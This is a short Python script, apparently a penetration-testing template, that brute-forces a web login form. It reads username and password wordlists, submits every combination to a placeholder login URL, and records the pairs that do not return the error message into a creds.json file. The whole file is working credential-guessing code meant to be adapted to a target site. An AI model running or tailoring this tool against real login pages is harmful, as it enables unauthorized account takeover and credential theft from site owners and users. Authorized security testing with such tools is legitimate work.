#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : bruteforce_login.py
# Author             : Podalirius (@podalirius_)
# Date created       : 10 Oct 2021

import argparse
import requests
import json


def readlist(file):
    f = open(file, 'r')
    data = [line.strip() for line in f.readlines()]
    f.close()
    return list(set(data))


def trylogin(username, password):
    ## Write your custom request here ====================================
    session = requests.Session()
    # Get cookies
    r = session.get("https://domain.ext/login")
    # Try auth
    r = session.post(
        "https://domain.ext/login",
        data={
            "Username": username,
            "Password": password
        }
    )
    # Change the error message you want to detect here;
    if b'Incorrect username or password' in r.content:
        return False
    else:
        return True
    ## Write your custom request here ====================================


def parseArgs():
    parser = argparse.ArgumentParser(description="Description message")
    parser.add_argument("-u", "--users", default=None, required=True, help='')
    parser.add_argument("-p", "--passwords", default=None, required=True, help='')
    parser.add_argument("-v", "--verbose", default=False, action="store_true", help='')
    return parser.parse_args()


if __name__ == '__main__':
    options = parseArgs()

    wordlist_usernames = readlist(options.users)
    wordlist_passwords = readlist(options.passwords)

    # Generate combinations
    comb = []
    for password in wordlist_passwords:
        for username in wordlist_usernames:
            comb.append((username, password))

    # Waits for all the threads to be completed
    for _c in comb:
        u, p = _c[0], _c[1]
        if trylogin(u, p):
            print("[+] Valid login found (%s, %s)" % (u, p))
            f = open("creds.json", "a")
            f.write(json.dumps({"username": u, "password": p}) + "\n")
            f.close()
        else:
            if options.verbose == True:
                print("[!] Incorrect login for (%s, %s)" % (u, p))
